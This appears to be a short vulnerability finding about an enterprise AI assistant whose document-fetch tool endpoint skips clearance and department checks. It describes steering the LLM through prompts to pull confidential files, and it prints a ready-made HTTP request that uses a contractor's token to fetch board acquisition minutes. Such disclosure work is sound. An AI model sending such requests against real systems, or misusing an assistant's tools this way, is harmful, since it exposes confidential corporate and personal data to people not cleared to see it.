diagnosis: The workplace AI assistant tool endpoint resolves enterprise documents from cloud storage using documentId provided in tool arguments. It does not check if the authenticated employee possesses the necessary security clearance or department membership to read the document. By steering the LLM through conversational prompts or calling the tool endpoint directly, an employee can retrieve executive compensation tables, merger discussions, or confidential legal memos.
exploit_request:
POST /api/ai/tools/fetch-document HTTP/1.1
Host: assistant.intranet.enterprise.com:8113
Authorization: Bearer <general_contractor_jwt>
Content-Type: application/json

{"toolArguments": {"documentId": "doc_board_minutes_acquisition_target_q3"}}
